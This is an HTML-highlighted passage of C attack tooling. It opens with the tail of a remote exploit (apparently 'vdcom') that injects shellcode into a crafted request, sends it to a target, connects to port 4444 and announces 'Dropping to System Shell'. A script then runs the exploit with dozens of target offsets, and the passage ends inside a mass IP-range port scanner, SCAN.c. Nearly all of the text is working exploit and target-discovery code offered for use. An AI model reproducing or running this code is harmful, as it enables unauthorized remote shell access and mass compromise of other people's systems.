</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">request2</span><span class="sc10">+</span><span class="sc4">8</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">request2</span><span class="sc10">+</span><span class="sc4">8</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)/</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc11">len1</span><span class="sc10">,</span><span class="sc11">request2</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request2</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">len1</span><span class="sc10">=</span><span class="sc11">len1</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc11">len1</span><span class="sc10">,</span><span class="sc11">sc</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">len1</span><span class="sc10">=</span><span class="sc11">len1</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc11">len1</span><span class="sc10">,</span><span class="sc11">request3</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request3</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">len1</span><span class="sc10">=</span><span class="sc11">len1</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request3</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc11">len1</span><span class="sc10">,</span><span class="sc11">request4</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request4</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">len1</span><span class="sc10">=</span><span class="sc11">len1</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request4</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">8</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">8</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x10</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x10</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x80</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x80</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x84</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x84</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0xb4</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0xb4</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0xb8</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0xb8</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0xd0</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0xd0</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x18c</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">buf2</span><span class="sc10">+</span><span class="sc4">0x18c</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)-</span><span class="sc4">0xc</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc11">bindstr</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">bindstr</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">)==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">perror</span><span class="sc10">(</span><span class="sc6">"- Send"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">len</span><span class="sc10">=</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1000</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc11">buf2</span><span class="sc10">,</span><span class="sc11">len1</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">)==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">perror</span><span class="sc10">(</span><span class="sc6">"- Send"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">sleep</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">target_ip</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">target_ip</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">target_ip</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc4">4444</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">sock</span><span class="sc10">=</span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">perror</span><span class="sc10">(</span><span class="sc6">"- Socket"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">target_ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">target_ip</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"- Exploit appeared to have failed.\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> 

</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"- Dropping to System Shell...\n\n"</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc11">shell</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">serv</span><span class="sc0">



</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">44</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">45</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">46</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">11</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">12</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">13</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">14</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">15</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">17</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">18</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">19</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">21</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">22</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">23</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">24</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">25</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">26</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">27</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">28</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">29</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">30</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">31</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">33</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">34</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">35</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">36</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">37</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">38</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">39</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">40</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">41</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">42</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">43</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc10">./</span><span class="sc11">vdcom</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc0"> </span><span class="sc11">$1</span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc11">SCAN</span><span class="sc10">.</span><span class="sc11">c</span><span class="sc0">


</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;errno.h&gt;
</span><span class="sc0">
</span><span class="sc9">#define MAX_SOCKETS 1000
#define TIMEOUT 2
</span><span class="sc0">
</span><span class="sc9">#define S_NONE 0
#define S_CONNECTING 1
</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">conn_t</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">status</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">time_t</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">conn_t</span><span class="sc0"> </span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">MAX_SOCKETS</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">init_sockets</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">check_sockets</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">done</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">aa</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bb</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ns</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">time_t</span><span class="sc0"> </span><span class="sc11">scantime</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ip</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Usage: %s &lt;a-block&gt; &lt;port&gt; [b-block] [c-block]\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">done</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">bb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">cc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">aa</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">aa</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">aa</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">aa</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"Invalid a-range\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"Bad port number.\n"</span><span class="sc10">);</span><span class="sc0"> 

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">bb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">bb</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bb</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">))</span><span class="sc0">
</span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"Invalid b-range.\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

